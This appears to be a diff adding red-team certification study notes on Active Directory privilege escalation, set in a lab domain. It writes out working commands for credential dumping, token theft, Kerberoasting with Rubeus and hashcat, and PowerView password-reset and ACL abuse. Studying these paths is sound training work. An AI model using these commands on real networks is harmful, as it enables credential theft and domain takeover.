@@ -1,0 +1,107 @@
+Q1 You have a low-priv domain user. You enumerate and find a user with an SPN set.
+
+    What attack do you perform? Kerberoasting
+    What’s the dependency for success? Weak/crackable password
+    What’s your next step after getting the result? Cracking offline -> reuse creds -> enumerate with new privs
+
+
+Q2 You compromise a machine and have local admin, but no domain creds yet.
+
+    What are your top 3 immediate actions? dump creds from memory (mimikatz or beacon> logonpasswords), check for active sessions, dump lsass, check files for creds, check sctasks/services
+    NOTE: local admin = credential access opportunity, not instant win
+
+
+Q3 You dump creds and find: a domain user with no obvious privileges, but they are part of a group that has GenericWrite over another user
+
+    What does that allow you to do? take over the user account, change password, add an SPN and kerberoast them, add to group, modify attributes
+
+
+Q4 You find unconstrained delegation on a server.
+
+    What’s the abuse path? can be used to extract TGTs as the server caches TGTs of users who authenticate
+    What do you need to wait for or trigger? high-value user (like DA) to authenticate, we can use rubeus to monitor and coerce authentication
+
+
+Q5 You have a user account with SeImpersonatePrivilege on a machine.
+
+    What attack do you use? Use potato-family exploit
+    What’s the typical end result? SYSTEM, which gives us cred dumping power to get DA
+
+Q6 You run BloodHound and see: User → WriteDACL → Group → Domain Admins
+    What’s your move? we control the ACL of the group, so we can grant ourselves full control / generic all over the group then add ourselves
+
+NOTE:
+    Whenever you land on a host:
+        Am I local admin?
+        If yes:
+            Dump creds
+            Check tokens
+            Check sessions
+        Only then:
+            Start enumeration
+
+CRTO scenario example
+    
+    Beacon on WS01
+    Context: CORP\j.smith (low-priv user)
+    No credentials yet
+    Domain: corp.local
+
+    🎯 Goal: Domain Admin
+
+    first steps: 
+        1. enumerate my user to get an idea of what im working with
+            beacon> run whoami /all
+        2. check for low-hanging credential access (logged-in users, cached creds, tokens)
+            beacon> logonpasswords
+            beacon> ps (OR explore processes)
+            beacon> users 
+            beacon> token list
+            beacon> steal_token <pid> (OR token impersonate)
+        3. begin querying LDAP for additional object information 
+            admin accounts using ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))
+            accounts with SPN set using ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))))
+            delegation settings!
+                unconstrained: beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+                constrained: beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
+        once ive gathered info visualize the env using BOFHound
+
+    now we found svc_sql (Kerberoastable) and svc_sql → GenericWrite → backup_admin         
+        kerberoast svc_sql using
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /simple
+        then throw the output into hashcat to see if we can crack it 
+            hashcat -a 0 -m 13100 svcsql.hash /usr/wordlists/rockyou.txt
+        once we have control over svc_sql, we should go for the GenericWrite abuse first to takeover the backup_admin account
+            with GenericWrite over backup_admin, you can modify attributes like:
+                Password
+                SPNs
+                Account properties
+                But not:
+                   Group memberships (unless you control the group itself)
+            escalation options:
+                change the password!
+                    Set-DomainUserPassword -Identity backup_admin -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
+                    then login as the user!
+                add an SPN 
+                    Set-DomainObject -Identity backup_admin -Set @{servicePrincipalName='fake/service'}
+                    then kerberoast
+                        Rubeus.exe kerberoast /user:backup_admin
+    
+    now that we have backup_admin account, enumeration begins again
+        whoami /all
+        cred harvest:
+            beacon> logonpasswords
+                    sekurlsa::tickets
+        no credentials found, lets pivot to AD analysis
+            lets analyze using LDAP queries and visualize using BOFHound
+        say we find backup_admin -> WriteDACL -> Helpdesk Group -> GenericalAll -> DC01
+            we can modify the ACL to gain control
+                Add-DomainObjectAcl -TargetIdentity Helpdesk_Group -PrincipalIdentity backup_admin -Rights All
+            now we add ourselves
+                Add-DomainGroupMember -Identity Helpdesk_Group -Members backup_admin
+            once we are successfully members of Helpdesk_Group, we may be able to:
+                Access certain servers (often helpdesk tools / RDP boxes)
+                Reset passwords for users (very common)
+                Access user management tools
+                Sometimes delegated AD rights
+                
